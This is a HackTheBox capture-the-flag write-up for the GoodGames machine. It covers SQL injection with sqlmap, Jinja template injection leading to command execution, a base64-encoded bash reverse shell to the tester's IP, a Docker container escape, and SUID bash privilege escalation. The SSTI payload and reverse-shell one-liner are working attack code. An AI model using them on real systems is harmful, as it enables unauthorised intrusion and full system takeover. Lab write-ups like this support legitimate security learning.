# HackTheBox - GoodGames

## NMAP

```bash
PORT   STATE SERVICE  VERSION
80/tcp open  ssl/http Werkzeug/2.0.2 Python/3.9.2
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS POST
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store

```

## PORT 80 (HTTP)

Visting port 80 it shows us about a gaming page where it lists the current games

<img src="https://i.imgur.com/yzRxVHB.png"/>

<img src="https://i.imgur.com/SdttGHv.png"/>

But it's just a static page where these links won't lead to anywhere , there's a page to a store which says that it will be available soon

<img src="https://i.imgur.com/eDoFqQX.png"/>

There's a login page but it asks for an email address so I left this form , and went with signing up a user

<img src="https://i.imgur.com/GTwBbJg.png"/>

<img src="https://i.imgur.com/cGJCiWl.png"/>

<img src="https://i.imgur.com/mn0T2Lv.png"/>

After creating a user we can login on the site

<img src="https://i.imgur.com/ZgxY6NN.png"/>

With the password reset , I tried to see if it was taking a user name in the parameters 

<img src="https://i.imgur.com/3Wc5sG7.png"/>

<img src="https://i.imgur.com/D1OUxW6.png"/>

It wasn't taking any username so taking a step back on the login page

<img src="https://i.imgur.com/SwLT4of.png"/>

We can't perform sqli like this as it's matching the format of an email address so , I intercepted the request with burp and save the request , after that ran `sqlmap` 

<img src="https://i.imgur.com/YtrxeoJ.png"/>

<img src="https://i.imgur.com/TgbQ5M3.png"/>

This shows that it's vulnerable to sqli , so let's just dump the database.

<img src="https://i.imgur.com/IR5tyS3.png"/>

Being a time based sqli , it was taking some time to dump the data , so we only want the users table so let's just dump that

```bash
sqlmap -r sql --batch -D main -T user --dump
```

<img src="https://i.imgur.com/IRHAuq6.png"/>

We can then just skip the rest of the data as we only needed the admin hash, using crackstation to crack hash we can get the password `superadministrator`

<img src="https://i.imgur.com/vaaIFF6.png"/>

So logging with the admin credentials

<img src="https://i.imgur.com/vPflPCO.png"/>

On becoming admin , we can see another options which would take us to `internal-administration.goodgames.htb`

<img src="https://i.imgur.com/IDXmAw9.png"/>

<img src="https://i.imgur.com/dF6gllf.png"/>

This brings us another login page for `Flask Volt`

<img src="https://i.imgur.com/aYQF2PZ.png"/>

I looked if there were any default credentials for this but it seems that it's just a template on github for flask applications login page and being a flask application it might be vulnerable to one of the common attacks which is Server Side Template Injection `SSTI` maybe as this is the first thing that I would look at

<img src="https://i.imgur.com/NH5yIbd.png"/>

<img src="https://i.imgur.com/fPVkUpn.png"/>

So now let's look for an input field where we can test for SSTI payloads

<img src="https://i.imgur.com/SlSVzqh.png"/>

Setting page has an input field for username , so testing with payload `{{7*7}}` it should return the result 49

<img src="https://i.imgur.com/weIcVpr.png"/>

It did now we need to find which template engine it's using , to do that we can check with payload `{{7*'7'}}` , if it still returns the result 49 that means it's using  `twig` or if it returns 7777777 then it's using `jinja`

<img src="https://i.imgur.com/WHrkj5Z.png"/>

So it's jinja , now we need to look for payload to get command execution

```bash
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
```
Using this payload we can execute shell commands

<img src="https://i.imgur.com/DNOud1x.png"/>

This returns as a root user , normally you would get a low privleged user like `www-data` or some other user could be that this application is hosted in a docker container  , using bash reverse shell we can get a shell by first convert the reverse shell payload to base64

<img src="https://i.imgur.com/d81uI0h.png"/>

```bash
 echo "bash -i >& /dev/tcp/10.10.14.77/2222 0>&1" | base64

```

```bash
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Ny8yMjIyIDA+JjEK" |base64 -d| bash').read() }}
```

<img src="https://i.imgur.com/fclaAa2.png"/>

<img src="https://i.imgur.com/R39NGnl.png"/>

Running `ifconfig`

<img src="https://i.imgur.com/KRQvqV4.png"/>

This IP address tells that we are indeed inside in a container , running `df -h` to see disk space we can see a directory `/home/augustus` from `/dev/sda1` as this user doesn't exist on this docker container this probably mounted from the host machine 

<img src="https://i.imgur.com/IKQc3vZ.png"/>

<img src="https://i.imgur.com/Q0iZqqh.png"/>

So here I thought of adding an ssh for `augustus` by creating a `.ssh` folder and adding the public key in `authorized_keys` file

<img src="https://i.imgur.com/jhsDlWa.png"/>

And then changing the owner of that folder to `augustus`

<img src="https://i.imgur.com/SXxSSrE.png"/>

But the host machine didn't had ssh service running when we ran nmap , could be that it's open locally or we can access it from the container

<img src="https://i.imgur.com/od8uTzi.png"/>

We can't , we know that this container's IP address is `172.19.0.2` and whenever we run a docker container on a host machine that machine becomes a gateway and the IP is assigned to `172.19.0.1`

Let's verify this by transferring a static binary of nmap

<img src="https://i.imgur.com/aLmWu4X.png"/>

<img src="https://i.imgur.com/iUpbREL.png"/>

This shows that port 80 and 22 is open , so let's give it a shot

<img src="https://i.imgur.com/KslXSrd.png"/>

And we are on the host machine now

<img src="https://i.imgur.com/7m7nDyw.png"/>

Running `sudo -l` to see what permissions we have but there's no sudo binary

<img src="https://i.imgur.com/LdaF8xK.png"/>
 
 So going back again , we saw that we can change permissions in augustus's folder ,so let's just create a file and see if it gets reflected with the room permissions 
 
 <img src="https://i.imgur.com/eukzaJC.png"/>
 
 Logging back again , we see that the file has root permissions , so we can just copy bash , make it a SUID and run it on the host machine
 
 <img src="https://i.imgur.com/FyRX7aS.png"/>
 
 <img src="https://i.imgur.com/2NMc7ue.png"/>
 
 But it didn't ran and started screaming about a library file so I transferred my host machine's bash file on the docker container , made that a SUID again and then tried running the binary and it worked
 
 <img src="https://i.imgur.com/yF70iqL.png"/>
 
 <img src="https://i.imgur.com/HsKUNQT.png"/>



## References

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
